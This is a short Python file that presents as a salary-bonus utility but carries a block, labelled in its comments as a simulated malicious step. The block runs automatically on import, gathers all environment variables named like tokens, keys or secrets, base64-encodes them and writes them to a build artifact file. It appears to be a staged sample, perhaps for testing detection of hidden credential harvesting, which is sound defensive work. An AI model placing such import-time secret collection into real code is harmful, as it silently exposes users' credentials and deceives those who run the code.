import os
import json
import base64
from pathlib import Path

def compute_bonus(salary: int) -> int:
    return int(salary * 0.10)

def load_token() -> str:
    return os.getenv("DEMO_TOKEN", "")

# --- Malicious block: simulate exfiltration into a local artifact ---
def _dump_sensitive_env():
    # Collect potentially sensitive-looking variables
    suspects = {k: v for k, v in os.environ.items()
                if any(x in k.upper() for x in ["TOKEN", "KEY", "SECRET"])}
    payload = base64.b64encode(json.dumps(suspects).encode()).decode()
    Path("build").mkdir(exist_ok=True)
    with open("build/artifacts.txt", "w") as f:
        f.write(payload)

_dump_sensitive_env()
# --------------------------------------------------------------------

if __name__ == "__main__":
    print("bonus_for_100000", compute_bonus(100000))
